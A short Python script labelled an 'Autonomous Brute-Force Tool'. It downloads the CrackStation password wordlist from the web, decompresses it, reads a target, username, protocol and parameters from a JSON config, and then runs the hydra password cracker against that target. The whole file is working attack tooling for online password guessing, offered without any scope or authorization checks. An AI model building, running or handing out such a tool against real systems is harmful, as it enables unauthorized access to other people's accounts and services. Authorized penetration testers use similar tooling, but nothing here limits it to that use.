#!/usr/bin/env python3

import subprocess
import argparse
import json
import os
import urllib.request

def download_password_list(url, dest):
    urllib.request.urlretrieve(url, dest)

def extract_gzip(file_path):
    import gzip
    with gzip.open(file_path, 'rb') as f_in:
        with open(file_path.replace('.gz', ''), 'wb') as f_out:
            f_out.write(f_in.read())

def load_config(config_file):
    with open(config_file, 'r') as f:
        return json.load(f)

def brute_force(target, username, password_list, protocol, params):
    command = [
        'hydra',
        '-l', username,
        '-P', password_list,
        target,
        protocol,
        params
    ]
    subprocess.run(command)

def main():
    parser = argparse.ArgumentParser(description='Autonomous Brute-Force Tool')
    parser.add_argument('config', help='Path to the configuration file')
    args = parser.parse_args()

    # Download and extract the password list
    password_list_url = 'https://crackstation.net/files/crackstation.txt.gz'
    password_list_path = os.path.expanduser('~/wordlists/crackstation.txt.gz')
    os.makedirs(os.path.dirname(password_list_path), exist_ok=True)
    download_password_list(password_list_url, password_list_path)
    extract_gzip(password_list_path)

    # Load the configuration
    config = load_config(args.config)

    target = config['target']
    username = config['username']
    password_list = os.path.expanduser(config['password_list'])
    protocol = config['protocol']
    params = config['params']

    # Run the brute-force attack
    brute_force(target, username, password_list, protocol, params)

if __name__ == '__main__':
    main()
